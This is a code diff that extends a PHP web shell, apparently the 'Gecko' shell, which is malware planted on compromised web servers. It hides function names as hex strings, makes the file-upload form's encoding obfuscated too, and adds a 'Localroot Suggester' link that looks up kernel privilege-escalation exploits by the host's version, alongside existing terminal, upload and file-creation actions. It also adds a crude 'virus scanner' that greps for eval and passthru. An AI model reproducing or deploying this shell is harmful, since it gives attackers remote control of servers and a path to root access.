@@ -34,6 +34,7 @@ $Array = [
     '726d646972', // r m d i r => 29
     '756e6c696e6b', // u n l i n k => 30
     '66696c65', // f i l e => 31
+    '6d756c7469706172742f666f726d2d64617461' // m u l t i p a r t / f o r m d a t a => 32
 ];
 $hitung_array = count($Array);
 for ($i = 0; $i < $hitung_array; $i++) {
@@ -200,7 +201,7 @@ if (!empty($_GET['download'])) {
         .settings {
             float: right;
             position: relative;
-            margin-top: -165px;
+            margin-top: -200px;
 
         }
 
@@ -518,7 +519,7 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
             <li>
                 User : <?= $fungsi[22](); ?>
             </li>
-            <form action="" method="post" enctype="multipart/form-data">
+            <form action="" method="post" enctype="<?= $fungsi[32] ?>">
                 <li><input type="file" name="gecko-file" id=""><input type="submit" class="upload-submit" name="upload-submit" value="Upload"></li>
             </form>
         </ul>
@@ -528,6 +529,8 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=terminal" class=""><i class="fa-solid fa-terminal"></i>&nbsp;Terminal</a></li>
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=file" class=""><i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File</a></li>
                     <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=folder" class=""><i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder</a></li>
+                    <li><a href="https://www.exploit-db.com/search?q=Linux%20Kernel%20<?= linux_version(); ?>" class=""><i class="fa-solid fa-bug"></i>&nbsp;Localroot Suggester</a></li>
+                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&virus_scanner=true" class=""><i class="fa-solid fa-virus"></i>&nbsp;Virus Scanner</a></li>
                     <li><a href="https://github.com/MadExploits" class=""><i class="fa-solid fa-book"></i>&nbsp;Readme</a></li>
                 </ul>
             </div>
@@ -757,6 +760,27 @@ $scdir = $fungsi[16]("{.[!.],}*", GLOB_BRACE);
 
 <?php
 
+if ($_GET['virus_scanner'] == True) {
+    // Check if windows or Linux
+    // refrence https://www.niagahoster.co.id/blog/apa-itu-backdoor/
+    if ($fungsi[11] == "nt") {
+        $cmd = _mad_cmd("findstr /r /s /n /C:'eval' && findstr /r /s /n /C:'passthru'>gecko_virus.txt");
+        if ($cmd) {
+            echo success();
+        } else {
+            echo failed();
+        }
+    } else {
+        $cmd = _mad_cmd("grep -Rn 'eval' && grep -Rn 'passthru' > gecko_virus.txt");
+        if ($cmd) {
+            echo success();
+        } else {
+            echo failed();
+        }
+    }
+}
+
+
 if (isset($_POST['submit-chmod'])) {
     $numberChmod = $_POST['chmod'];
     $chm_o_d = chmod($fungsi[9] . "/" . $_GET['chmod'], is_int($numberChmod));
@@ -933,6 +957,13 @@ function symlinkDomain()
         $dom = "$count Domain";
     }
     return $dom;
+}
+
+function linux_version()
+{
+    $pecah = explode(" ", $GLOBALS['fungsi'][11]());
+    $pcah = explode("-", $pecah[2]);
+    return $pcah[0];
 }
 
 function perms($file)
